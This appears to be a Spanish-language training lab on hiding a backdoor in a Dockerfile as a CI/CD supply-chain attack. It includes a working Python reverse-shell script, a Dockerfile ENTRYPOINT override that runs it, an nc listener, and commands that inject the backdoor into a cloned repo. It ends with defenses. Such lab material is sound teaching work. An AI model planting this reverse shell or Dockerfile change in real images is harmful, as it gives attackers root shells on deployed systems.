# 04 - Dockerfile backdoor

**Clase 2 · 20 min · M3 Demo 03**
**Fase:** persistencia en el artefacto / supply chain
**MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain), T1059 (Command and Scripting Interpreter)
**Riesgo OWASP CI/CD:** CICD-SEC-3 (abuso de dependencias), CICD-SEC-9 (integridad del artefacto)

## Escenario

Tienes acceso de escritura al repo (o a un PR). No necesitas tocar la
aplicacion: basta con cambiar el `Dockerfile` para que la imagen que se
construye y despliega abra una shell cuando alguien la arranque. La app sigue
funcionando igual; el backdoor viaja dentro del artefacto.

En este lab la imagen base es la app victima del compose y ya trae `/flag.txt`.
El objetivo es demostrar que el `Dockerfile` es codigo ejecutable, no un archivo
de configuracion inocente.

## Objetivo de aprendizaje

- Modificar el arranque de una imagen sin tocar el codigo de la app.
- Entender la diferencia entre `CMD` y `ENTRYPOINT` heredados.
- Ver por que el escaneo de vulnerabilidades no detecta esto (lab 18).

## Antes de empezar

```bash
mkdir -p ~/lab-dockerfile && cd ~/lab-dockerfile
```

## Paso 1 - Escribir el backdoor

`revshell.py`:

```python
import os
import socket
import subprocess

def revshell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

revshell()
```

`Dockerfile`:

```dockerfile
FROM devops-lab-webapp:latest

COPY revshell.py /root/revshell.py
ENTRYPOINT ["python", "/root/revshell.py"]
```

**Por que `ENTRYPOINT` y no `CMD`:** la imagen base define
`ENTRYPOINT ["./entrypoint.sh"]`. Si en tu imagen pones `CMD`, el `ENTRYPOINT`
heredado sigue mandando y el `CMD` solo se usa como argumento; ademas
`./entrypoint.sh` es una ruta relativa y se rompe si cambias de `WORKDIR`. Al
declarar `ENTRYPOINT` lo sustituyes. Es un detalle que se ve en un engagement
real: el backdoor no arranca hasta que entiendes la herencia de la imagen.

## Paso 2 - Construir y ejecutar

Terminal 1:

```bash
nc -lvnp 4444
```

Terminal 2:

```bash
cd ~/lab-dockerfile
docker build -t lab-backdoor:1 .
docker run --rm --network host lab-backdoor:1
```

**Que esperar:** en la terminal 1 aparece una shell con `uid=0(root)`.

```bash
cat /flag.txt
```

**Que esperar:** `FLAG{dockerfile_backdoor}`

`--network host` es necesario por dos motivos: el backdoor conecta a
`127.0.0.1:4444` y queremos que ese `127.0.0.1` sea el de tu maquina, no el del
contenedor.

## Paso 3 - Comprobar que la app "parece normal"

```bash
docker run --rm devops-lab-webapp:latest sh -c 'ls /app && ls /flag.txt'
```

**Que demuestra:** el flag esta en la imagen base y el codigo de la app no ha
cambiado. Un revisor que solo mire `app/` no ve nada raro.

## Paso 4 - Ver el cambio desde el punto de vista del pipeline

En un CI real el atacante no ejecuta `docker build` a mano: modifica el
`Dockerfile` del repo y espera a que el runner construya. Puedes simularlo:

```bash
cd /tmp && rm -rf repo-df
git clone http://dev:dev12345@localhost:3000/devops-org/devops-demo.git repo-df
cd repo-df
cp ~/lab-dockerfile/revshell.py app/revshell.py
printf '\nCOPY revshell.py /root/revshell.py\nENTRYPOINT ["python", "/root/revshell.py"]\n' >> app/Dockerfile
git diff -- app/Dockerfile
```

No hace falta empujarlo para el lab; el `git diff` es la evidencia de que el
cambio viaja en el PR.

## Evidencia para el informe

- `Dockerfile` modificado (diff).
- Salida de `docker history` o `docker inspect` con el `ENTRYPOINT` nuevo.
- Captura de la shell y del flag.
- Por que Trivy no lo detecta: no es una CVE ni una mala configuracion conocida.

## Checkpoint

1. Que diferencia practica hay entre `CMD` y `ENTRYPOINT` al heredar una imagen?
2. Por que el backdoor no se ejecuta si usas `--network bridge`?
3. Que firma o control detectaria una imagen construida desde un Dockerfile
   modificado?

## Defensa

- Firma y escaneo de imagenes en el registry (cosign, trivy).
- Revisar cambios en `Dockerfile`, `ENTRYPOINT` y `CMD` en el PR, no solo codigo.
- Registry inmutable y despliegue por digest, no por tag mutable.
- Construir con un runner sin secretos y con egress restringido.
- Politica de admision que rechace imagenes no firmadas.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| `exec: "./entrypoint.sh": no such file` | pusiste `CMD` y cambiaste `WORKDIR`; usa `ENTRYPOINT` |
| La shell no aparece | el listener no estaba arriba o falta `--network host` |
| `python` no existe en la imagen | la app victima es Python; si usas otra base, ajusta el interprete |
